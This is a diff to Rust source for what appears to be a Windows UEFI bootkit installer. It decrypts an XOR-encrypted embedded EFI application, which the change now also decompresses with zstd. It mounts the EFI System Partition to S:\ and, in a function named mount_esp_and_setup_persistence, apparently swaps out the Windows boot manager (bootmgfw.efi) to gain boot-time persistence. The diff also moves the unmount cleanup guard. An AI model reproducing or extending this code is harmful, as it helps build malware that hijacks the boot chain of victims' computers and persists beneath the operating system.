@@ -1,5 +1,4 @@
 use std::ffi::c_void;
-use std::io::Write;
 use std::path::PathBuf;
 use std::{fs, io, ptr};
 
@@ -27,10 +26,14 @@ use windows_sys::core::GUID;
 use windows_sys::w;
 
 fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
-    for (i, c) in EFI_APPLICATION_ENCRYPTED.iter().enumerate() {
-        let m = c ^ EFI_APPLICATION_KEY[i % EFI_APPLICATION_KEY.len()];
-        f.write_all(&[m])?;
-    }
+    let decompressed = EFI_APPLICATION_ENCRYPTED
+        .iter()
+        .zip(EFI_APPLICATION_KEY.iter().cycle())
+        .map(|(&c, &k)| c ^ k)
+        .collect::<Vec<u8>>();
+
+    let mut decompressor = zstd::Decoder::new(decompressed.as_slice())?;
+    io::copy(&mut decompressor, f)?;
 
     Ok(())
 }
@@ -195,6 +198,16 @@ fn mount_esp_and_setup_persistence() -> bool {
             }
 
             println!("Mounted ESP to S:\\");
+            let guard2 = DropGuard::new((), |_| {
+                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };
+
+                if status == 0 {
+                    let error = unsafe { GetLastError() };
+                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
+                } else {
+                    println!("Unmounted ESP from S:\\");
+                }
+            });
 
             let bootdir = PathBuf::from("S:\\EFI\\Microsoft\\Boot");
             let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
@@ -225,17 +238,6 @@ fn mount_esp_and_setup_persistence() -> bool {
                     return false;
                 }
             }
-
-            let guard2 = DropGuard::new((), |_| {
-                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };
-
-                if status == 0 {
-                    let error = unsafe { GetLastError() };
-                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
-                } else {
-                    println!("Unmounted ESP from S:\\");
-                }
-            });
 
             drop(guard2);
             return true;
